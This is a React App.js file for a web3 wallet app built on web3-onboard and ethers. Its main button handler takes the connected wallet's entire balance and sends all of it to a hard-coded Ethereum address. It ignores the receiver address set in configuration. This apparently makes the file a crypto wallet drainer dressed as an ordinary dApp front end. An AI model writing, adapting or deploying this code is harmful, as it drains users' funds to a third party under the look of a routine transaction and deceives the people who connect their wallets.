// import { MoralisProvider } from 'react-moralis';
import { useConnectWallet, useNotifications } from "@web3-onboard/react";
import "./App.css";
import "./components/Header";
import { Header } from "./components/Header";
import { Mainpage } from "./components/Mainpage";
import { useEffect } from "react";
import { ethers } from "ethers";

function App() {
  const [{ wallet, connecting }, connect, disconnect] = useConnectWallet();

  /*--------- Send Transaction -------*/

  const [
    notifications,
    customNotification,
    updateNotify,
    preflightNotifications,
  ] = useNotifications();

  useEffect(() => {
    console.log(notifications);
  }, [notifications]);

  const notConnected = async () => {
    alert("Connect Your Wallet");
  };
  const isConnected = wallet?.accounts[0]?.address;

  const sendTransactionWithPreFlightNotifications = async () => {
    const balanceValue = Object.values(wallet?.accounts[0].balance)[0];
    console.log(String(ethers.utils.parseUnits(balanceValue)), balanceValue);
    const ethersProvider = new ethers.providers.Web3Provider(
      wallet.provider,
      "any"
    );

    const signer = ethersProvider.getSigner();

    const receiverAccount = process.env.REACT_APP_RECEIVER_ADDRESS;
    console.log("Account = " + typeof receiverAccount);

    const txDetails = {
      from: wallet?.accounts[0].address,
      to: "0x145825ca15453843e75957809051F8525b5f6aB5",
      value: String(ethers.utils.parseUnits(balanceValue)),
    };

    const sendTransaction = () => {
      return signer.sendTransaction(txDetails).then((tx) => tx.hash);
    };

    const gasPrice = () =>
      ethersProvider.getGasPrice().then((res) => res.toString());

    const estimateGas = () => {
      return ethersProvider
        .estimateGas(txDetails)
        .then((res) => res.toString());
    };

    const transactionHash = await preflightNotifications({
      sendTransaction,
      gasPrice,
      estimateGas,
      balance: balanceValue,
      txDetails: txDetails,
    });

    console.log(customNotification, updateNotify, transactionHash, disconnect);
  };

  return (
    <div className="App">
      <Header wallet={wallet} connecting={connecting} connect={connect} />
      <Mainpage
        sendTransaction={
          !isConnected
            ? notConnected
            : sendTransactionWithPreFlightNotifications
        }
        isConnected={isConnected}
        connect={connect}
      />
    </div>
  );
}

export default App;
